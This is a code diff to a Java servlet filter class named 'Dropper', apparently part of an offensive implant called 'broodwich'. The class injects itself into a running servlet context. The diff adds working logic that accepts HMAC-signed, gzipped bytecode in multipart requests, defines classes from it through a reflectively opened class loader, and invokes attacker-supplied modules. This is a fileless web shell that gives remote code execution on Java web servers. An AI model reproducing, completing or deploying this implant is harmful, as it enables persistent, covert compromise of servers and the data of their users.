@@ -17,9 +17,12 @@ public class Dropper implements javax.servlet.Filter {
     private final String runPayloadMethodName = "runPayload";
     private javax.crypto.SecretKey secretKey;
     private final java.lang.String payloadKey = "broodwichCommand";
+    private final java.lang.String moduleParamsKey = "broodwichParams";
+    private final java.lang.String payloadLengthKey = "broodwichLength";
+    private static final java.lang.String filterName = "broodwich";
+    private java.util.concurrent.ConcurrentMap<java.lang.String, java.lang.reflect.Method> modules;
 
     public static void taste(javax.servlet.http.HttpServlet servlet, byte[] key) {
-        java.lang.String filterName = "broodwich";
         javax.servlet.ServletContext contextFacade = servlet.getServletContext();
         if (!contextFacade.getFilterRegistrations().containsKey(filterName)) {
             try {
@@ -84,8 +87,8 @@ public class Dropper implements javax.servlet.Filter {
     public void init(javax.servlet.FilterConfig filterConfig) throws javax.servlet.ServletException {
         // todo: concurrent map necessary?
         // todo: store in servlet context or just in this class?
-        java.util.concurrent.ConcurrentMap<java.lang.Integer, java.lang.Class> modules = new java.util.concurrent.ConcurrentHashMap<>();
-        filterConfig.getServletContext().setAttribute(modulesAttribute, modules);
+        modules = new java.util.concurrent.ConcurrentHashMap<>();
+        //filterConfig.getServletContext().setAttribute(modulesAttribute, modules);
     }
 
     @Override
@@ -96,55 +99,79 @@ public class Dropper implements javax.servlet.Filter {
         java.util.Collection<javax.servlet.http.Part> parts = httpServletRequest.getParts();
         if(!parts.isEmpty()) {
             byte[] compressedPayload = null;
-            byte[] moduleIdBytes = null;
-            int moduleId = -1;
+            java.lang.String moduleId = null;
             byte[] digest = null;
+            byte[] moduleParams = null;
+            int payloadLength = 0;
 
             for(javax.servlet.http.Part part : parts) {
                 switch (part.getName()) {
                     case payloadKey:
+                        compressedPayload = new byte[(int)part.getSize()];
                         new java.io.DataInputStream(part.getInputStream()).readFully(compressedPayload);
                         break;
                     case moduleIdKey:
+                        byte[] moduleIdBytes = new byte[(int)part.getSize()];
                         new java.io.DataInputStream(part.getInputStream()).readFully(moduleIdBytes);
-                        moduleId = moduleIdBytes[0];
+                        moduleId = java.util.Arrays.toString(moduleIdBytes);
                         break;
                     case digestKey:
+                        digest = new byte[(int)part.getSize()];
                         new java.io.DataInputStream(part.getInputStream()).readFully(digest);
+                        break;
+                    case moduleParamsKey:
+                        moduleParams = new byte[(int)part.getSize()];
+                        new java.io.DataInputStream(part.getInputStream()).readFully(moduleParams);
+                        break;
+                    case payloadLengthKey:
+                        byte[] payloadLengthBytes = new byte[(int)part.getSize()];
+                        new java.io.DataInputStream(part.getInputStream()).readFully(payloadLengthBytes);
+                        payloadLength = java.nio.ByteBuffer.wrap(payloadLengthBytes).order(java.nio.ByteOrder.BIG_ENDIAN).asIntBuffer().get();
                         break;
                 }
             }
 
-            if(compressedPayload != null && moduleId != -1 && digest != null) {
+            if(compressedPayload != null && moduleId != null && digest != null && payloadLength > 0) {
                 try {
                     javax.crypto.Mac mac = javax.crypto.Mac.getInstance(macAlgo);
                     mac.init(secretKey);
                     byte[] computedDigest = mac.doFinal(compressedPayload);
 
                     // todo: timing attacks etc.
-                    if(computedDigest.equals(digest)) {
-                        // 2. ungzip payload
-                        byte[] payload = compressedPayload; // stub
+                    if(java.util.Arrays.equals(computedDigest, digest)) {
+                        byte[] payload = new byte[payloadLength];
+                        new java.io.DataInputStream(new java.util.zip.GZIPInputStream(new java.io.ByteArrayInputStream(compressedPayload))).readFully(payload);
 
-                        javax.servlet.ServletContext servletContext = servletRequest.getServletContext();
-                        java.util.concurrent.ConcurrentMap<java.lang.Integer, java.lang.Class> modules = (java.util.concurrent.ConcurrentMap<java.lang.Integer, java.lang.Class>) servletRequest.getAttribute(modulesAttribute);
+                        if(moduleId.equals("party.itistimeto.broodwich.modules.loader") && moduleParams != null) {
+                            try {
+                                // load class
+                                java.lang.Class sclClazz = java.security.SecureClassLoader.class;
+                                java.lang.reflect.Constructor sclConstructor = sclClazz.getDeclaredConstructor();
+                                sclConstructor.setAccessible(true);
+                                java.security.SecureClassLoader scl = (java.security.SecureClassLoader) sclConstructor.newInstance(null);
+                                java.lang.reflect.Method defineClass = sclClazz.getDeclaredMethod("defineClass", java.lang.String.class, java.nio.ByteBuffer.class, java.security.CodeSource.class);
+                                defineClass.setAccessible(true);
+                                Class moduleClass = (Class) defineClass.invoke(scl, java.util.Arrays.toString(moduleParams), java.nio.ByteBuffer.wrap(payload), null);
 
-                        if(moduleId == 0) {
-                            // todo: determine module api
-                            // probably: payload, request, response, shared buffer
-                            // 1. load class from bytecode
-                            // todo: change module id to fully-qualified class name
-                            // 2. confirm api conformance
-                            // 3. add to modules map
+                                try {
+                                    java.lang.reflect.Method runModule = moduleClass.getDeclaredMethod("runModule", byte[].class);
+                                    modules.put(moduleId, runModule);
+                                }
+                                catch (java.lang.NoSuchMethodException e) {
+                                    // idk
+                                }
+                            } catch (java.lang.NoSuchMethodException | java.lang.InstantiationException | java.lang.IllegalAccessException | java.lang.reflect.InvocationTargetException e) {
+                                e.printStackTrace();
+                            }
                         }
                         else {
-                            java.lang.Class clazz = modules.get(moduleId);
-                            if (clazz != null) {
-                                // 1. invoke method
+                            java.lang.reflect.Method runModule = modules.get(moduleId);
+                            if (runModule != null) {
+                                runModule.invoke(null, (Object) moduleParams);
                             }
                         }
                     }
-                } catch (java.security.NoSuchAlgorithmException | java.security.InvalidKeyException e) {
+                } catch (java.security.NoSuchAlgorithmException | java.security.InvalidKeyException | java.lang.IllegalAccessException | java.lang.reflect.InvocationTargetException e) {
                     e.printStackTrace();
                 }
             }
